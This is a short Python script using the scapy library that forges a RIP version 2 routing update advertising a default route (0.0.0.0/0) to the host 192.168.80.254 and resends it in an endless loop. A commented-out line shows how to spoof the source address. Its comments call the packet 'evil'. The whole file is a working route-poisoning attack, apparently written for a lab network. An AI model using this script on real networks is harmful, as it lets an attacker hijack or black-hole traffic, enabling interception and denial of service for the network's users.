from scapy.all import *
# prepare the evil packet
pkt_evil = Ether()/IP(dst='192.168.80.254')/UDP(sport=520,dport=520)/RIP(cmd=2,version=2)/RIPEntry( AF="IP",RouteTag=0,addr="0.0.0.0",mask="0.0.0.0",nextHop="0.0.0.0",metric=2)
# spoof the source IP
#pkt_evil[IP].src = spoof_ip
# keep sending the evil packet every second
sendp(pkt_evil, loop=1, inter=2)